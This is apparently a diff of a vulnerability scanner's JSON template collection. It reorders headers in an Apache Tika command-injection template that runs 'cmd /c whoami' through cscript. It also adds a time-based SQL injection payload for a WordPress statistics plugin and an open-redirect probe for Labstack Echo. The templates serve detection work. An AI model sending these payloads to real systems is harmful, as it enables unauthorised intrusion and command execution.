@@ -6756,11 +6756,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -21728,6 +21728,20 @@
       ]
     },
     {
+      "id": "CVE-2022-33965",
+      "info": {
+        "name": "WP Visitor Statistics (Real Time Traffic) < 5.8 - Unauthenticated SQLi",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nGET /?wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331'+and+sleep(5)+or+' HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-34045",
       "info": {
         "name": "Wavlink WN530HG4 - Access Control",
@@ -22139,6 +22153,21 @@
         {
           "raw": [
             "POST /plugins/servlet/groupexportforjira/admin/json HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ngroupexport_searchstring=&groupexport_download=true\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-40083",
+      "info": {
+        "name": "Labstack Echo < v4.9.0 - Open Redirect",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}//interactsh.com%2f.."
           ]
         }
       ]
